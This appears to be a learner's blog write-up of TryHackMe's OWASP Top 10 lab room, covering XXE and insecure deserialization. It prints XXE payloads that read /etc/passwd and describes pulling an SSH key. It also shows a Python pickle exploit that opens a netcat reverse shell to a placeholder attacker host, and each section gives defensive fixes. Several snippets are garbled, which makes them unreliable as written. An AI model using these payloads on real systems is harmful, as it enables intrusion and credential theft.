# TryHackMe: Cyber Security 101 - OWASP Top 10

## Overview

Cyber Security 101 is TryHackMe's introductory path covering the fu 11 breadth of the field rather than one specialty. It's broken into modules that build on each other:

- **Cyber Security Fundamentals** - networking basics, the CIA triad, common attack types, and how security teams are structured
- **Offensive Security Tooling** - enumeration and exploitation tooling (Nmap, Metasploit, Burp Suite, web app attacks)
- **Defensive Security** - SOC operations, digital forensics, and incident response fundamentals
- **Defensive Security Tooling** - CyberChef, CAPA, REMnux, and FlareVM for analysis and reverse engineering
- **Cryptography** - symmetric/asymmetric encryption and hashing, and where each shows up in real systems

Working through the whole path end to end gave me a working vocabulary and hands-on reps across both the "break it" and "defend it" sides of security - which is exactly the balance I wanted before specializing further.

The room I found most demanding, and the one most worth writing up in detail, was **OWASP Top 10**, under the Offensive Security Tooling module.

## OWASP Top 10 Room

This room walks through the ten most critical web application security risks as defined by the OWASP Foundation, with a hands-on vulnerable web app for each category:

1. Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. XML External Entity (XXE)
5. Broken Access Control
6. Security Misconfiguration
7. Cross-Site Scripting (XSS)
8. Insecure Deserialization
9. Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

Most of the categories clicked quickly - command injection and broken access control, for example, are fairly intuitive once you under stand that the app is trusting input it shouldn't. The two that actually slowed me down were **XXE** and **Insecure Deserialization**, because both require understanding *how the application processes data behind the scenes* before you can see where to attack it. Below is how I worked through each.


### Deep Dive: XML External Entity (XXE)
**The concept:** XML documents can define custom "entities" inside a DOCTYPE declaration - essentially variables that get substituted into the document when it's parsed. If an XML parser is configured to resolve *external* entities (ones pointing to a file path or URL rather than a literal string) and it's parsing user-supplied XML, an attacker can define an entity that points at a file on the server's filesystem. When the parser resolves it, the file's contents get echoed back into the application's output.

This was the first room in the path where I had to actually understand a file format's spec (not just guess at a syntax) before I could exploit anything. I had to get comfortable with DTDs (Document Type Definitions): what defines a valid XML structure before the entity substitution trick made sense.

**What I did:**

First, I confirmed the injection point was actually parsing my DTD by sending a harmless custom entity and checking that it rendered in the response:

```xml
<}xmI version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe "test value" >
]>
<foo>&xxe; </ foo>
```

Once that confirmed the app would substitute my entity, I swapped the entity's value from a literal string to a 'SYSTEM' identifier pointing at a local file:

```xml
<?xm] version="1.0" encoding="ISO-8859-1"?>
< IDOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe; </foo>
```

The server dutifully read the file and returned its contents in the page response, which is the core of the vulnerability. From there I used the same technique against /home/<user≥/. ssh/id_rsa to pull a private SSH key straight off the box, which drove home just how much damage an "it just reads a file" bug can actually do. A arbitrary  file read this way can lead directly to full account/system compromise if credentials or keys are exposed.

**The part I got stuck on:** encoding. My first few attempts failed silently because I hadn't accounted for how the app was passing my payload (URL-encoding it before parsing). Once I made sure the payload survived transit intact, the substitution worked as expected.

**Fix, in a real environment:** disable DTD processing and external entity resolution in the XML parser entirely (most modern parsers support this with a config flag), and never let a parser accept untrusted XML with external entities enabled by default.

### Deep Dive: Insecure Deserialization

**The concept:** Serialization converts an in-memory object into a format (like a byte stream) that can be stored or sent over a network, deserialization reverses that. The vulnerability shows up when an application deserializes data it received from the client *without validating it first* because deserializing untrusted data can mean handing the attacker a way to reconstruct arbitrary objects, or in the worst case, execute arbitrary code.
This was harder for me conceptually than XXE because the vulnerability isn't really in a specific input field, it's in a whole design pattern (trusting client-controlled state) that shows up disguised as something as ordinary looking as a cookie.

**What I did:**

The vulnerable app stored an application cookie that was base64 encoded serialized data. Decoding it showed a Python pickle object controlling account attributes, including a userType field. Changing that field's value and re-encoding the cookie was enough to escalate a normal account to admin, no authentication bypass exploit needed, just handing the server data it trusted a little too much.

The bigger escalation was on the feedback/exchange feature, which took a serialized payload and ran it through pickle.loads(). Because pickle will happily execute a reduce method during deserialization, I could craft a malicious pickled object that ran an arbitrary shell command as a side effect of being deserialized. In this case, a reverse shell payload:

```python
import pickle, os, base64

class RCE:
 def__reduce__(self) :
  cmd = ('rm/tmp/f; mkfifo/tmp/f; cat /tmp/f| /bin/sh - i 2>&1 ‘
      ‘| netcat<ATTACKERIP> 4444> /tmp/f')
  return (os. system, (cmd,))

payload = base64.b64encode (pickle.dumps (RCE()))
print(payload.decode())
```

After starting a netcat listener on my machine and resulting base64 string as the cookie value, deserialization server triggered the command and I caught a shell back. Full remote code execution from what looked, on the surface, like a normal cookie field.

**The part I got stuck on:** understanding *why* this worked. Deserialization frameworks like pickle aren't just decoding data they're re-running constructors and methods to rebuild an object, which means a crafted object can make the deserializer execute code as a byproduct of doing its normal job. Once that clicked, the exploit path made a lot more sense than just following steps.

**Fix, in a real environment:** never deserialize untrusted input with formats that support arbitrary code execution ( ‘pickle’ in Python, native serialization in Java/PHP without restrictions). Use dat a formats like JSON for anything client-facing, and if serialized object must be trusted, sign and verify them before deserializing.

## Takeaways

The OWASP Top 10 room specifically pushed me past "run the tool, get the flag" and into actually reasoning about *why* an app trusts data it shouldn't, which is the mindset the rest of the room categories (injection, broken auth, misconfig) all come back to as well.

